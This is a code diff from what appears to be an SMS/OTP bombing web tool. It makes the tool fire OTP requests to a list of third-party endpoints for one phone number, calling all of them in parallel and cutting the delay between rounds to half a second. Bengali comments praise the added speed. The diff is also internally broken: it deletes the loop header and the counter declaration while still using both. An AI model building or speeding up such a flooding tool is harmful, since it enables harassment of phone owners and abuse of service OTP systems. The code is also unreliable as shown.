@@ -213,19 +213,15 @@
         { url: `https://api.need.com.bd/v1/user/otp`, method: 'POST', data: { phone: phone } }
       ];
 
-      let successCount = 0;
-      for (let i = 0; i < amount; i++) {
-        timerDisplay.innerText = `Time Left: ${amount - i}s`;
-        
-        for (let api of apis) {
-          let result = await sendRequest(api.url, api.method, api.data);
-          if (result) successCount++;
-        }
+// সব এপিআই একসাথে কল হবে (খুব ফাস্ট হবে)
+        await Promise.all(apis.map(api => sendRequest(api.url, api.method, api.data).then(res => {
+          if (res) successCount++;
+        })));
 
         let progress = ((i + 1) / amount) * 100;
         progressBar.style.width = progress + '%';
-        await delay(1000); 
-      }
+        
+        await delay(500); // প্রতি রাউন্ডের পর মাত্র আধা সেকেন্ড বিরতি
 
       // ১ নম্বর জায়গা ক্লিয়ার এবং সাকসেস মেসেজ (৩ নম্বর)
       timerDisplay.innerText = ""; 
